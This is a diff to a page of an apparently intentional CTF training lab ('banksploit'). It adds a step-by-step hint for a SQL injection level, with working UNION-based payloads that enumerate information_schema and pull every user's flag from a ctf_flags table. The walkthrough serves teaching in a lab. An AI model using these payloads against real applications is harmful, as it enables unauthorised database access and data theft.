@@ -391,6 +391,16 @@ WHERE customer_id = '<span class="inj">BS100234' #</span>'
           <div class="slbody">
             <div class="lab">The mitigation at this level</div><p>The term is used exactly as typed, and raw SQL errors are shown. The result grid has 7 columns.</p>
             <div class="lab">How to solve it</div><p>Close the string, then <code>UNION</code> a select from <code>ctf_flags</code> (flag lands in the Remarks cell) — or leak it through an error.</p>
+            <div class="lab">Step by step — reach the table, then read it</div>
+            <ol style="margin:.3rem 0 .5rem 1.25rem;font-size:.95rem;line-height:1.7">
+            <li><b>Confirm the injection.</b> Enter a lone quote <code>'</code> &mdash; the raw SQL error proves your term is concatenated straight into the query.</li>
+            <li><b>Count the columns.</b> <code>%' ORDER BY 7#</code> succeeds; <code>%' ORDER BY 8#</code> errors &rarr; the query returns <b>7 columns</b>.</li>
+            <li><b>Find the readable column.</b> <code>zzz' UNION SELECT 1,2,3,4,5,6,7#</code> (a non-matching term, so only your injected row shows) &mdash; the grid prints <code>2</code> in <b>Remarks</b>, so your data goes in position 2 (position 1 = Date, truncated to 10 chars).</li>
+            <li><b>Name the database.</b> <code>zzz' UNION SELECT 1,database(),3,4,5,6,7#</code> &rarr; <code>banksploit</code>.</li>
+            <li><b>List the tables.</b> <code>zzz' UNION SELECT 1,table_name,3,4,5,6,7 FROM information_schema.tables WHERE table_schema=database()#</code> &rarr; reveals <code>ctf_flags</code> among them.</li>
+            <li><b>List that table's columns.</b> <code>zzz' UNION SELECT 1,column_name,3,4,5,6,7 FROM information_schema.columns WHERE table_name='ctf_flags'#</code> &rarr; <code>id,user_id,username,vuln_key,flag,description,created_at</code>.</li>
+            <li><b>Extract the flag.</b> <code>zzz' UNION SELECT username,flag,3,4,5,6,7 FROM ctf_flags#</code> &mdash; every user's flag lands in Remarks; read the row whose Date cell shows your own username. Narrow to just yours with <code>&hellip; FROM ctf_flags WHERE vuln_key='statements.g2'#</code>.</li>
+            </ol>
             <pre class="code">... WHERE (from_account_id=:a1 OR to_account_id=:a2)
     AND remarks LIKE '%<span class="inj">%' UNION SELECT username,flag,3,4,5,6,7 FROM ctf_flags#</span>%'
 <span class="cmt">your UNION row joins the result set → another user's flag in the grid</span></pre>
